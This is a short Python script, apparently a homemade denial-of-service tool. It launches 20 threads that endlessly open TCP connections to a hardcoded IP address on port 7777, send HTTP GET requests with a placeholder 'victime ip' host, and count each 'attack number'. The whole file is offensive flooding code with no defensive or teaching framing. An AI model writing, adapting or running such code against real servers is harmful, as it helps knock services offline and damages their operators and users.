import socket

import threading



attack_num = 0



def attack():

    global attack_num

    while True:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(('15.235.149.57', 7777))

        s.send(b'GET / HTTP/1.1\r\nHOST: victime ip\r\n\r\n')

        resp = s.recv(4096)



        attack_num += 1

        print('attack number:', attack_num)

        s.close()





for i in range(20):

    thread = threading.Thread(target=attack)

    thread.start()
